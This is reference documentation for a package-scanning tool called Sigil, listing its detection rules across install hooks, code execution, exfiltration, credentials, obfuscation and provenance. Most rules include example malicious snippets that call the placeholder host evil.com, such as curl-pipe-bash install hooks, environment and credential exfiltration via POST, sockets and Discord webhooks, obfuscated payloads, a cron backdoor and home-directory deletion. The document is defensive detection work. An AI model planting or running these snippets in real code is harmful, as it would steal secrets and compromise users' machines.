# Sigil Scan Rules Reference

Sigil runs six scan phases on every target. Each phase contains multiple rules that check for specific patterns. Findings are weighted by phase severity and summed to produce a cumulative risk score.

## Score Summary

| Phase | Name | Weight | Description |
|-------|------|--------|-------------|
| 1 | Install Hooks | 10x | Scripts that execute during package installation |
| 2 | Code Patterns | 5x | Dangerous code execution and deserialization |
| 3 | Network / Exfiltration | 3x | Outbound network calls and data exfiltration |
| 4 | Credentials | 2x | Access to secrets, keys, and credential stores |
| 5 | Obfuscation | 5x | Techniques to hide malicious code |
| 6 | Provenance | 1-3x | Metadata and trustworthiness signals |

---

## Phase 1: Install Hooks (Critical -- 10x)

Install hooks run automatically when a package is installed, before the developer reviews any code. A single malicious hook can compromise an entire machine.

### Rule 1.1: Python setup.py cmdclass

**What it detects:** Custom install commands in `setup.py` that override the standard install behavior. The `cmdclass` directive lets package authors run arbitrary code during `pip install`.

**Pattern matches:**
- `cmdclass` in `setup.py`
- `install_requires` combined with `subprocess`
- `os.system(` in `setup.py`
- `os.popen(` in `setup.py`

**Example -- triggers the rule:**

```python
# setup.py
from setuptools import setup
from setuptools.command.install import install
import os

class PostInstall(install):
    def run(self):
        install.run(self)
        os.system('curl https://evil.com/payload.sh | bash')

setup(
    name='innocent-looking-package',
    version='1.0.0',
    cmdclass={'install': PostInstall},
)
```

**Example -- does NOT trigger:**

```python
# setup.py
from setuptools import setup

setup(
    name='normal-package',
    version='1.0.0',
    install_requires=['requests>=2.28.0'],
)
```

### Rule 1.2: npm Lifecycle Scripts

**What it detects:** `preinstall`, `postinstall`, and `preuninstall` scripts in `package.json`. These run automatically during `npm install`.

**Pattern matches:**
- `"preinstall"` in `package.json`
- `"postinstall"` in `package.json`
- `"preuninstall"` in `package.json`

**Example -- triggers the rule:**

```json
{
  "name": "innocent-helper",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node install.js"
  }
}
```

Where `install.js` contains:

```javascript
const { execSync } = require('child_process');
const fs = require('fs');
const env = JSON.stringify(process.env);
execSync(`curl -X POST -d '${env}' https://evil.com/collect`);
```

**Example -- does NOT trigger:**

```json
{
  "name": "normal-package",
  "version": "1.0.0",
  "scripts": {
    "build": "tsc",
    "test": "jest",
    "start": "node index.js"
  }
}
```

### Rule 1.3: Makefile Install Targets with Network/Exec

**What it detects:** Makefile `install` targets that contain network commands (`curl`, `wget`) or execution commands (`eval`, `exec`, `bash -c`).

**Pattern matches:**
- `curl` in Makefile install targets
- `wget` in Makefile install targets
- `eval` in Makefile install targets
- `exec` in Makefile install targets
- `bash -c` in Makefile install targets

**Example -- triggers the rule:**

```makefile
install:
	curl -sSL https://evil.com/setup.sh | bash
	@echo "Installed"
```

**Example -- does NOT trigger:**

```makefile
install:
	cp bin/mytool /usr/local/bin/mytool
	chmod +x /usr/local/bin/mytool
```

---

## Phase 2: Code Patterns (High -- 5x)

Dangerous code execution patterns that enable arbitrary code execution, deserialization attacks, or dynamic imports.

### Rule 2.1: eval / exec / compile

**What it detects:** Functions that execute arbitrary code from strings.

**Pattern matches:**
- `eval(` in `.py`, `.js`, `.ts`, `.jsx`, `.tsx`, `.mjs`, `.sh` files
- `exec(` in the same file types
- `compile(` in the same file types

**Example -- triggers the rule:**

```python
# Python
user_input = get_input()
eval(user_input)
```

```javascript
// JavaScript
const code = Buffer.from(encoded, 'base64').toString();
eval(code);
```

### Rule 2.2: Dynamic Imports

**What it detects:** Runtime module loading that can import arbitrary code.

**Pattern matches:**
- `__import__(`
- `importlib.import_module`

**Example -- triggers the rule:**

```python
module_name = config.get('plugin')
mod = __import__(module_name)
mod.execute()
```

### Rule 2.3: Subprocess with Shell

**What it detects:** Subprocess calls with `shell=True`, which enables shell injection.

**Pattern matches:**
- `subprocess.call` combined with `shell=True`
- `subprocess.Popen` combined with `shell=True`

**Example -- triggers the rule:**

```python
import subprocess
user_input = get_command()
subprocess.call(user_input, shell=True)
```

### Rule 2.4: OS-Level Execution

**What it detects:** Direct operating system command execution.

**Pattern matches:**
- `os.system(`
- `os.popen(`

**Example -- triggers the rule:**

```python
import os
os.system(f'rm -rf {user_path}')
```

### Rule 2.5: Unsafe Deserialization

**What it detects:** Deserialization functions that can execute arbitrary code during object reconstruction.

**Pattern matches:**
- `pickle.loads`
- `yaml.load(` (without SafeLoader)
- `yaml.unsafe_load`
- `marshal.loads`

**Example -- triggers the rule:**

```python
import pickle
data = requests.get('https://example.com/data.pkl').content
obj = pickle.loads(data)  # Can execute arbitrary code
```

### Rule 2.6: Foreign Function Interface

**What it detects:** Loading native libraries at runtime.

**Pattern matches:**
- `ctypes.cdll`

**Example -- triggers the rule:**

```python
import ctypes
lib = ctypes.cdll.LoadLibrary('./malicious.so')
lib.execute()
```

### Rule 2.7: JavaScript Code Execution

**What it detects:** JavaScript patterns for dynamic code execution.

**Pattern matches:**
- `Function(` (constructor)
- `child_process`
- `vm.runInNewContext`
- `new Function`

**Example -- triggers the rule:**

```javascript
const { exec } = require('child_process');
exec('cat /etc/passwd', (err, stdout) => {
  fetch('https://evil.com/collect', { method: 'POST', body: stdout });
});
```

---

## Phase 3: Network and Exfiltration (High -- 3x)

Outbound network calls that could exfiltrate data or establish command-and-control channels.

### Rule 3.1: Python HTTP Clients

**Pattern matches:**
- `requests.post`
- `requests.put`
- `urllib.request.urlopen`
- `http.client`

**Example -- triggers the rule:**

```python
import requests
import os

secrets = {k: v for k, v in os.environ.items() if 'KEY' in k or 'SECRET' in k}
requests.post('https://evil.com/collect', json=secrets)
```

### Rule 3.2: JavaScript HTTP Clients

**Pattern matches:**
- `fetch(`
- `XMLHttpRequest`
- `axios.post`

**Example -- triggers the rule:**

```javascript
const env = JSON.stringify(process.env);
fetch('https://evil.com/collect', { method: 'POST', body: env });
```

### Rule 3.3: Raw Sockets

**Pattern matches:**
- `socket.connect`
- `websocket`

**Example -- triggers the rule:**

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.com', 4444))
s.send(open('/etc/passwd').read().encode())
```

### Rule 3.4: Tunneling and Proxies

**Pattern matches:**
- `ngrok`

**Example -- triggers the rule:**

```python
import subprocess
subprocess.Popen(['ngrok', 'tcp', '22'])  # Expose SSH to the internet
```

### Rule 3.5: Webhook Exfiltration

**Pattern matches:**
- `webhook`
- `discord.com/api/webhooks`
- `telegram.org/bot`

**Example -- triggers the rule:**

```python
import requests, os
webhook = 'https://discord.com/api/webhooks/1234567890/abcdef'
data = {'content': f"AWS_KEY={os.environ.get('AWS_SECRET_ACCESS_KEY')}"}
requests.post(webhook, json=data)
```

### Rule 3.6: DNS Tunneling

**Note:** DNS tunneling detection is handled via the broader network pattern matching. Explicit DNS query libraries and unusual DNS patterns are flagged.

---

## Phase 4: Credentials (Medium -- 2x)

Access patterns for environment variables, configuration files, and credential stores.

### Rule 4.1: Environment Variable Access

**Pattern matches:**
- `.env` file references
- `AWS_SECRET`
- `AWS_ACCESS_KEY`
- `PRIVATE_KEY`
- `API_KEY`
- `DATABASE_URL`
- `OPENAI_API_KEY`
- `ANTHROPIC_API_KEY`

**Example -- triggers the rule:**

```python
import os
api_key = os.environ['OPENAI_API_KEY']
aws_secret = os.environ['AWS_SECRET_ACCESS_KEY']
```

**Filtering:** Results exclude lines that are comments (`#`, `//`), type definitions, descriptions, and example files to reduce false positives.

### Rule 4.2: Credential File Access

**Pattern matches:**
- `ssh/` directory references
- `.aws/credentials`
- `.kube/config`

**Example -- triggers the rule:**

```python
import os
creds = open(os.path.expanduser('~/.aws/credentials')).read()
```

### Rule 4.3: Credential Store Access

**Pattern matches:**
- `keychain`
- `credential`
- `password`
- `secret`

**Filtering:** This rule has broad patterns and relies on filtering to exclude comments, test files, documentation, and type definitions. The 2x weight keeps the score contribution low for individual matches.

**Example -- triggers the rule:**

```python
import keyring
password = keyring.get_password('service', 'username')
```

---

## Phase 5: Obfuscation (High -- 5x)

Techniques used to hide malicious code from human review and automated scanning. Legitimate code rarely uses obfuscation, making this the strongest intent signal.

### Rule 5.1: Base64 Decoding

**Pattern matches:**
- `base64.b64decode` (Python)
- `atob(` (JavaScript)
- `Buffer.from` combined with `base64` (Node.js)

**Example -- triggers the rule:**

```python
import base64
code = base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgZXZpbC5jb20vcGF5bG9hZCB8IGJhc2gnKQ==')
exec(code.decode())
```

```javascript
const payload = atob('ZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20vY29sbGVjdCcpOw==');
eval(payload);
```

### Rule 5.2: Hex-Encoded Strings

**Pattern matches:**
- `\x` followed by hex digit pairs (e.g., `\x41\x42`)

**Example -- triggers the rule:**

```python
cmd = '\x63\x75\x72\x6c\x20\x65\x76\x69\x6c\x2e\x63\x6f\x6d'  # "curl evil.com"
os.system(cmd)
```

### Rule 5.3: Character Code Construction

**Pattern matches:**
- `String.fromCharCode` (JavaScript)
- `charCodeAt` (JavaScript)

**Example -- triggers the rule:**

```javascript
// Builds "eval" from character codes to avoid detection
const fn = String.fromCharCode(101, 118, 97, 108);
window[fn]('fetch("https://evil.com/collect?env=" + JSON.stringify(process.env))');
```

### Rule 5.4: Minified Payloads

**Note:** Currently detected via a combination of the above patterns. Dedicated minification detection (entropy analysis, line length analysis) is planned for a future release.

---

## Phase 6: Provenance (Low -- 1-3x)

Metadata analysis that assesses the trustworthiness of the code's origin and structure.

### Rule 6.1: Git History Depth

**What it checks:** Number of commits in the repository.

**Scoring:**
- Fewer than 3 commits: +2 to score
- No git history available: +3 to score

**Why it matters:** Malicious repositories are often created days before the attack with minimal commit history. Legitimate projects typically have a richer history.

### Rule 6.2: Author Count

**What it checks:** Number of unique commit authors.

**Reported as:** Informational (contributes to the overall provenance picture).

### Rule 6.3: Binary and Executable Files

**What it checks:** Files identified as `executable`, `ELF`, `Mach-O`, or `PE32` binaries.

**Scoring:** +10 per binary file detected.

**Why it matters:** Pre-compiled binaries cannot be scanned by Sigil or most static analysis tools. Their presence in a source package is suspicious.

**Example -- triggers the rule:**

```
$ file suspicious.bin
suspicious.bin: ELF 64-bit LSB executable, x86-64
```

### Rule 6.4: Hidden Files

**What it checks:** Files whose names start with `.`, excluding standard hidden files (`.git`, `.gitignore`, `.env.example`, `.eslintrc*`, `.prettierrc*`, `.editorconfig`).

**Scoring:** +1 for the presence of non-standard hidden files.

**Example -- triggers the rule:**

```
.backdoor.sh
.secret_config
.data_exfil.py
```

### Rule 6.5: Large Files

**What it checks:** Files larger than 1MB (excluding `.git/` and `node_modules/`).

**Scoring:** +1 for the presence of large files.

**Why it matters:** Unusually large files may contain embedded payloads, binary data, or obfuscated code.

### Rule 6.6: .env Files

**What it checks:** Presence of `.env` files (detected as hidden files).

**Why it matters:** A malicious package could include a `.env` file designed to override the developer's environment variables, redirecting API calls or credentials.

### Rule 6.7: Filesystem Manipulation

**What it checks:** Patterns that modify or delete files on the host system.

**Pattern matches:**
- `shutil.rmtree` (Python)
- `os.remove` / `os.unlink` (Python)
- `rimraf` (Node.js)
- `fs.unlinkSync` / `fs.writeFileSync` (Node.js)
- `/etc/passwd` / `/etc/shadow` references
- `chmod 777` / `chmod +s` (setuid)

**Scoring:** +3 per filesystem manipulation pattern found.

**Example -- triggers the rule:**

```python
import shutil
shutil.rmtree(os.path.expanduser('~'))  # Delete home directory
```

```javascript
const fs = require('fs');
fs.writeFileSync('/etc/cron.d/backdoor', '* * * * * root curl evil.com/payload | bash\n');
```

---

## External Scanner Integration

In addition to the six built-in phases, Sigil integrates with external security scanners when they are installed:

| Scanner | What It Adds | Install |
|---------|-------------|---------|
| **semgrep** | Advanced pattern matching with data flow analysis | `pip install semgrep` |
| **bandit** | Python-specific security linting | `pip install bandit` |
| **trufflehog** | Secret detection across git history and files | `brew install trufflehog` |
| **safety** | Known CVE scanning for Python dependencies | `pip install safety` |
| **npm audit** | Known CVE scanning for Node.js dependencies | Built into npm |

External scanner findings are added to the total score with a 3x weight multiplier for semgrep and bandit, a 10x multiplier for trufflehog (secret detection), and a 5x multiplier for npm audit critical/high findings.

---

## Additional Analysis

Beyond the six phases, Sigil runs two supplementary analyses:

### Dependency Analysis

- Counts direct dependencies in `requirements.txt` and `package.json`
- Flags high dependency counts (>30 direct dependencies)
- Detects unpinned dependency versions (supply chain risk)
- Reports `pyproject.toml` presence for modern Python packaging

### Permission and Scope Analysis

- Scans JSON, YAML, and TOML files for permission/scope/capability declarations
- Checks Dockerfiles for privileged mode and host networking
- Reviews GitHub Actions workflows for secret access
- Reports MCP/agent tool permission configurations
